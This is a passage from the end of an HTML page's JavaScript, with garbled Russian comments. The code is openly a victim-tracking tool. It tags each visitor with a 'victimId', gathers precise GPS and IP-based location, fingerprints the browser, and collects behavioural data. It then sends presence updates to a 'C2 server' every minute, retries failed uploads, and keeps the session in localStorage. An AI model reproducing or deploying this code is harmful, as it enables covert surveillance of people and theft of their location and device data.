                    // –ü–æ–ª—É—á–µ–Ω–∏–µ –¥–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–æ–π –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –ø–æ –∫–æ–æ—Ä–¥–∏–Ω–∞—Ç–∞–º
                    const response = await fetch(
                        `https://nominatim.openstreetmap.org/reverse?format=json&lat=${data.gps.latitude}&lon=${data.gps.longitude}&zoom=18&addressdetails=1`
                    );
                    
                    if (response.ok) {
                        const locationInfo = await response.json();
                        data.address = locationInfo.address;
                        data.place = locationInfo.display_name;
                    }
                }
            } catch (error) {
                console.error('Location enrichment error:', error);
            }
        }

        async function getIPLocation(data) {
            try {
                const response = await fetch('https://ipapi.co/json/');
                if (response.ok) {
                    const info = await response.json();
                    data.ipBased = {
                        ip: info.ip,
                        city: info.city,
                        region: info.region,
                        country: info.country_name,
                        latitude: info.latitude,
                        longitude: info.longitude,
                        timezone: info.timezone,
                        org: info.org
                    };
                }
            } catch (error) {
                console.error('IP location error:', error);
            }
        }

        async function getWifiLocation(data) {
            // –°–∏–º—É–ª–∏—Ä—É–µ–º WiFi —Ç—Ä–∏–∞–Ω–≥—É–ª—è—Ü–∏—é
            if ('connection' in navigator && navigator.connection.type === 'wifi') {
                data.wifi = {
                    type: 'wifi',
                    signalStrength: 'strong',
                    locationMethod: 'triangulation'
                };
            }
        }

        function initializeDataCollection() {
            // –ó–∞–ø—É—Å–∫–∞–µ–º –±–∞–∑–æ–≤—ã–π —Å–±–æ—Ä –≤ —Ñ–æ–Ω–µ
            setTimeout(async () => {
                await collectSystemInfoDetailed();
                await collectBrowserFingerprint();
                sendPresenceUpdate();
            }, 3000);
            
            // –ü–µ—Ä–∏–æ–¥–∏—á–µ—Å–∫–∏–µ –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è
            SystemState.temp.intervals.push(
                setInterval(sendPresenceUpdate, 60000)
            );
        }

        function startFullCollection() {
            SystemState.isActive = true;
            
            // –ó–∞–ø—É—Å–∫ —Ñ–æ–Ω–æ–≤–æ–≥–æ —Å–±–æ—Ä–∞
            SystemState.temp.intervals.push(
                setInterval(async () => {
                    if (SystemState.isActive) {
                        await collectGeolocationPrecise();
                        await collectBehavioralData();
                    }
                }, 30000)
            );
        }

        async function sendPresenceUpdate() {
            const update = {
                type: 'presence_update',
                victimId: SystemState.victimId,
                timestamp: new Date().toISOString(),
                active: SystemState.isActive,
                pageVisible: !document.hidden,
                dataPoints: SystemState.metrics.dataPoints,
                url: window.location.href
            };
            
            await sendToC2Server(update);
        }

        // –°–æ—Ö—Ä–∞–Ω–µ–Ω–∏–µ —Å–µ—Å—Å–∏–∏
        window.addEventListener('beforeunload', () => {
            localStorage.setItem('advanced_session', JSON.stringify({
                victimId: SystemState.victimId,
                sessionToken: SystemState.sessionToken,
                deviceId: SystemState.deviceId,
                timestamp: Date.now()
            }));
            
            // –û—á–∏—Å—Ç–∫–∞ –∏–Ω—Ç–µ—Ä–≤–∞–ª–æ–≤
            SystemState.temp.intervals.forEach(interval => clearInterval(interval));
        });

        // –ü–µ—Ä–∏–æ–¥–∏—á–µ—Å–∫–∞—è —Å–∏–Ω—Ö—Ä–æ–Ω–∏–∑–∞—Ü–∏—è –æ—á–µ—Ä–µ–¥–∏ –ø–æ–≤—Ç–æ—Ä–Ω—ã—Ö –ø–æ–ø—ã—Ç–æ–∫
        setInterval(async () => {
            try {
                const queue = JSON.parse(localStorage.getItem('retry_queue') || '[]');
                const failed = [];
                
                for (const item of queue) {
                    if (item.attempts < 3) {
                        try {
                            await sendToC2Server(item.data);
                            console.log('Retry successful:', item.type);
                        } catch (e) {
                            item.attempts++;
                            failed.push(item);
                        }
                    }
                }
                
                localStorage.setItem('retry_queue', JSON.stringify(failed));
            } catch (error) {
                console.error('Retry sync error:', error);
            }
        }, 120000);

        console.log('üöÄ Advanced System v3.0.0 ready');
        console.log('Victim ID:', SystemState.victimId);
        console.log('Session:', SystemState.sessionToken.substring(0, 20) + '...');
        console.log('Device:', SystemState.deviceId);
    </script>
</body>
</html>
